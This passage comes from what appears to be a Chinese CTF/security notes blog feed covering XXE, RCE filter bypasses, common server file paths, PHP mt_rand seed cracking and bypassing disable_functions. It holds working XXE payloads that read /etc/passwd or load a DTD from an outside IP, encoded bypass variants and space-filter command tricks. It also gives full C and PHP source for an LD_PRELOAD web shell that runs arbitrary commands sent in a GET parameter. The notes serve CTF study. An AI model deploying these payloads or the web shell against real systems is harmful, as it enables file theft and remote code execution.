    <content><![CDATA[<p>参考链接：<br><a href="https://www.freebuf.com/vuls/194112.html" target="_blank" rel="noopener">XXE萌新进阶全攻略</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">未知攻焉知防——XXE漏洞攻防</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489349&idx=1&sn=ab435be65bc6c35a21ea4bd040693d8c&source=41#wechat_redirect" target="_blank" rel="noopener">歪？我想要一个XXE。</a><br><a href="http://www.cl4y.top/xxe笔记/" target="_blank" rel="noopener">xxe笔记</a><br><a href="https://blog.szfszf.top/tech/blind-xxe-详解-google-ctf-一道题目分析/" target="_blank" rel="noopener">Blind XXE 详解 + Google CTF 一道题目分析</a><br><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html" target="_blank" rel="noopener">CTF XXE</a></p><h1 id="XXE-Attack"><a href="#XXE-Attack" class="headerlink" title="XXE Attack"></a>XXE Attack</h1><p>XML External Entity attack 即XXE XML外部实体攻击，通过构建非法xml实体，能够达到任意文件读取，甚至rce的目的。 </p><a id="more"></a>

<p>用以下的php代码来测试。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h1><p>XML 即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是： HTML 被设计用来显示数据 XML 被设计用来传输和存储数据 </p>
<blockquote>
<p>参数实体用% name申明，引用时用%name;，只能在DTD中申明，DTD中引用。 </p>
<p>其余实体直接用name申明，引用时用&name;，只能在DTD中申明，可在xml文档中引用。 </p>
</blockquote>
<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。<br>DTD的声明：指XML文档中声明该文档的DTD或DTD来源的部分，可以包含在使用它的XML文档内部，也可以以独立的DTD文档（*.dtd）文档存在。</p>
<p>所以DTD一般认为有两种引用或声明方式：</p>
<blockquote>
<p>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。<br>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。<br>（网上有提到的引用公共DTD其实也算外部引用DTD的一种）</p>
</blockquote>
<h3 id="XML基本文档结构"><a href="#XML基本文档结构" class="headerlink" title="XML基本文档结构"></a>XML基本文档结构</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [ </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span>                                                                          </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>DTD</strong> 引用方式(简要了解)</p>
<p><strong>1. DTD</strong> <strong>内部声明</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>

<p><strong>2. DTD</strong> <strong>外部引用</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;外部DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>3.</strong> <strong>引用公共</strong>DTD</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  &lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;......命名方法：以!DOCTYPE开始,configuration是文档根元素名称；PUBLIC表示是公共DTD；-表示是非ISO组织；mybatis.org表示组织；DTD 表示类型；Config 表示标签；3.0是标签后附带的版本号；EN表示DTD语言是英语；最后是DTD的URL；</span><br></pre></td></tr></table></figure>

<p><strong>DTD</strong> 实体声明</p>
<p><strong>1.</strong> <strong>内部实体声明</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号，示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;Thinking&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p><strong>2.</strong> <strong>外部实体声明</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p><strong>3.</strong> <strong>参数实体声明</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">or</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;</span><br><span class="line">%xxe;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;evil;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p>外部evil.dtd中的内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY evil SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;</span><br></pre></td></tr></table></figure>

<h1 id="XXE-简介"><a href="#XXE-简介" class="headerlink" title="XXE 简介"></a>XXE 简介</h1><p>外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 </p>
<h3 id="恶意引入外部实体0x01"><a href="#恶意引入外部实体0x01" class="headerlink" title="恶意引入外部实体0x01"></a>恶意引入外部实体0x01</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="恶意引入外部实体0x02"><a href="#恶意引入外部实体0x02" class="headerlink" title="恶意引入外部实体0x02"></a>恶意引入外部实体0x02</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % file SYSTEM "http://118.25.14.40:8200/hack.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;hhh;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>hack.dtd内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">hhh</span> <span class="attr">SYSTEM</span> '<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>'&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>这个很简单，利用正则匹配的不严格，大小写绕过</p>
<h3 id="html实体编码绕过"><a href="#html实体编码绕过" class="headerlink" title="html实体编码绕过"></a>html实体编码绕过</h3><p>如果过滤了http等协议，可以利用实体编码绕过：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a " &lt;!ENTITY %  b SYSTEM 'http://118.25.14.40:8200/hack.dtd'&gt; "&gt; </span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">    %b;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;hhh;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="data-协议绕过"><a href="#data-协议绕过" class="headerlink" title="data://协议绕过"></a>data://协议绕过</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a SYSTEM "data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMTguMjUuMTQuNDA6ODIwMC9oYWNrLmR0ZCc+"&gt;</span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">    %b;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>&amp;hhh;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--编码内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">b</span> <span class="attr">SYSTEM</span> '<span class="attr">http:</span>//<span class="attr">118.25.14.40:8200</span>/<span class="attr">hack.dtd</span>'&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="file-协议加文件上传"><a href="#file-协议加文件上传" class="headerlink" title="file://协议加文件上传"></a>file://协议加文件上传</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a SYSTEM "file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg"&gt;</span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">b</span> <span class="attr">SYSTEM</span> '<span class="attr">http:</span>//<span class="attr">118.25.14.40:8200</span>/<span class="attr">hack.dtd</span>'&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="php-filter协议加文件上传"><a href="#php-filter协议加文件上传" class="headerlink" title="php://filter协议加文件上传"></a>php://filter协议加文件上传</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a SYSTEM "php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg"&gt;</span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        &amp;hhh;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">hhh</span> <span class="attr">SYSTEM</span> '<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">./flag.php</span>'&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % a SYSTEM "php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg"&gt;</span></span><br><span class="line"><span class="meta">    %a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">        &amp;hhh;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--上传文件--&gt;</span></span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>CTF RCE(远程代码执行)</title>
    <url>/2020/05/13/CTF-RCE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p><a href="https://www.cnblogs.com/20175211lyz/p/11396392.html" target="_blank" rel="noopener">CTF RCE(远程代码执行)</a></p><h1 id="命令中空格被过滤的解决方法"><a href="#命令中空格被过滤的解决方法" class="headerlink" title="命令中空格被过滤的解决方法"></a>命令中空格被过滤的解决方法</h1><p>linux</p><blockquote>
<p>{cat,flag.txt}<br>cat${IFS}flag.txt<br>cat$IFS$9flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt<br>kg=$’\x20flag.txt’&amp;&amp;cat$kg<br>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</p>
</blockquote><a id="more"></a>


<p>windows下</p>
<blockquote>
<p>type.\flag.txt<br>type,flag.txt<br>echo,123456</p>
</blockquote>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>常见文件目录</title>
    <url>/2020/05/12/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95/</url>
    <content><![CDATA[<h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>web服务器会将请求写入到日志文件中，比如说apache。当用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在/var/log/apahce2/ </p><a id="more"></a>
<h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>登录注册类型要么sql注入要么session文件包含</p>
<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><ul>
<li>php默认生成的Session文件往往存在/tmp目录下</li>
<li>文件名为sess_PHPSESSID</li>
<li>session.upload_progress.enabled这个参数在php.ini默认开启，如果不是Off，就会在上传过程中生成上传进度文件，它的储存文件路径可以在phpinfo获取到</li>
</ul>
<h2 id="Nginx重要文件位置"><a href="#Nginx重要文件位置" class="headerlink" title="Nginx重要文件位置"></a>Nginx重要文件位置</h2><ul>
<li>配置文件存放目录：/etc/nginx</li>
<li>主配置文件：/etc/nginx/conf/nginx.conf 或 /etc/nginx/nginx.conf</li>
<li>管理脚本：/usr/lib64/systemd/system/nginx.service</li>
<li>模块：/usr/lisb64/nginx/modules</li>
<li>应用程序：/usr/sbin/nginx</li>
<li>程序默认存放位置：/usr/share/nginx/html</li>
<li>日志默认存放位置：/var/log/nginx</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>php_mt_seed</title>
    <url>/2020/05/11/php-mt-seed/</url>
    <content><![CDATA[<p><a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">PHP mt_rand安全杂谈及应用场景详解</a><br><a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_seed - PHP mt_rand() seed cracker</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass_now = &quot;FpCyLNvPOj&quot;;</span><br><span class="line">$allowable_characters = &apos;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;;</span><br><span class="line"></span><br><span class="line">$length = strlen($allowable_characters) - 1;</span><br><span class="line"></span><br><span class="line">for ($j = 0; $j &lt; strlen($pass_now); $j++) &#123;</span><br><span class="line">    for ($i = 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        if ($pass_now[$j] == $allowable_characters[$i]) &#123;</span><br><span class="line">            echo &quot;$i $i 0 $length &quot;;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>bypass open_basedir</title>
    <url>/2020/05/11/bypass-open-basedir/</url>
    <content><![CDATA[<p><a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">bypass open_basedir的新方法</a><br><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2" target="_blank" rel="noopener">从PHP底层看open_basedir bypass</a></p>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>一些不包含数字和字母的webshell</title>
    <url>/2020/05/11/%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell/</url>
    <content><![CDATA[<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a><br><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)</a></p><p> <a href="https://blog.csdn.net/mochu7777777/article/details/104631142" target="_blank" rel="noopener">https://blog.csdn.net/mochu7777777/article/details/104631142</a> </p><a id="more"></a>

<p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142" target="_blank" rel="noopener">关于PHP正则的一些绕过方法)</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>bypass_disable_functions</title>
    <url>/2020/05/09/bypass-disable-functions/</url>
    <content><![CDATA[<p><a href="http://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/" target="_blank" rel="noopener">bypass_disable_functions</a><br><a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">LD_PRELOAD &amp; putenv() 绕过 disable_functions &amp; open_basedir</a><br><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv()</a><br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">bypass_disablefunc_via_LD_PRELOAD</a></p><a id="more"></a>
<h3 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass_disable_functions"></a>bypass_disable_functions</h3><p>一般而言，利用漏洞控制 web 启动新进程 a.bin，a.bin 内部调用系统函数 b()，b() 位于系统共享对象 c.so 中，所以系统为该进程加载共 c.so，想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的 c.so 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。基于这一思路，常见突破 disable_functions 限制执行操作系统命令的方式为：</p>
<ul>
<li>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 getuid_shadow.so；</li>
<li>运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 getuid_shadow.so，以便后续启动新进程时优先加载该共享对象；( LD_PRELOAD是Unix中的一个环境变量，用于定义在程序运行前优先加载的动态链接库，LD和动态库有关，PRELOAD表示预加载，结合起来就是预先加载的动态库。通过这个环境变量，可以覆盖正常的函数库中的函数。)</li>
<li>运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 getuid_shadow.so 中的同名 getuid() 所劫持；</li>
<li>达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</li>
</ul>
<h4 id="a-c文件："><a href="#a-c文件：" class="headerlink" title="a.c文件："></a>a.c文件：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">  int main(int argc,char **argv)&#123;</span><br><span class="line">  char passwd[]=&quot;123456&quot;;</span><br><span class="line">  </span><br><span class="line">  if(argc&lt;2)&#123;</span><br><span class="line">  printf(&quot;input password!\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  if(!strcmp(passwd,argv[1]))&#123;</span><br><span class="line">  printf(&quot;Correct\n&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">  printf(&quot;Invalid\n&quot;);		  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 如果是不知道密码的情况下，就可以编写一个动态函数库来覆盖掉strcmp函数恒返回0以达到任意密码都返回Correct </p>
<blockquote>
<p>-fPIC 作用于编译阶段，告诉编译器产生与位置无关代码(Position-Independent Code)， 则产生的代码中，没有绝对地址，全部使用相对地址，故而代码可以被加载器加载到内存的任意 位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的</p>
</blockquote>
<h4 id="evil-c文件："><a href="#evil-c文件：" class="headerlink" title="evil.c文件："></a>evil.c文件：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int strcmp(const char *s1,const char *s2)&#123;</span><br><span class="line">    printf(&quot;evil function\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以绕过disable_functions,可以通过上传恶意so文件，劫持getuid(),达到命令执行目的。之所以劫持 getuid()，是因为 sendmail 程序会调用该函数（当然也可以为其他被调用的系统函数）</p>
<p>但是这种劫持函数的做法有很大的缺陷：</p>
<p> 一是，某些环境中，web 禁止启用 senmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1 lamp、lamp.、lamp.com）</p>
<h4 id="C-语言扩展修饰符"><a href="#C-语言扩展修饰符" class="headerlink" title="C 语言扩展修饰符"></a>C 语言扩展修饰符</h4><p>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那就完全可以不依赖 sendmail 了</p>
<p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，<strong>不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为</strong>。</p>
<p>此外，通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 <code>unsetenv(&quot;LD_PRELOAD&quot;)</code></p>
<h4 id="putenv"><a href="#putenv" class="headerlink" title="putenv"></a>putenv</h4><p>PHP中putenv()函数用于设置服务器环境变量，仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">putenv ( string $setting ) : bool</span><br></pre></td></tr></table></figure>

<p> 如 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">putenv(&quot;LD_PRELOAD=/tmp/evil.so&quot;);</span><br></pre></td></tr></table></figure>

<h4 id="bypass-c文件："><a href="#bypass-c文件：" class="headerlink" title="bypass.c文件："></a>bypass.c文件：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern char** environ; //获取环境变量</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line">    //获取EVIL_CMDLINE的值</span><br><span class="line">    int i;</span><br><span class="line">    //从环境变量中遍历“LD_PRELOAD”的位置，并将其值设为NULL。</span><br><span class="line">    //从而使下面的system()正常执行。</span><br><span class="line">    for (i = 0; environ[i]; ++i) &#123;</span><br><span class="line">            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;</span><br><span class="line">                    environ[i][0] = &apos;\0&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 执行命令</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC bypass.c -o bypass_x64.so</span><br></pre></td></tr></table></figure>

<h4 id="bypass-php"><a href="#bypass-php" class="headerlink" title="bypass.php:"></a>bypass.php:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); //设置EVIL_CMDLINE环境变量</span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);  //加载恶意动态库</span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);  //利用mail函数触发恶意函数，跳转至__attribute__ ((__constructor__))修饰的函数。</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
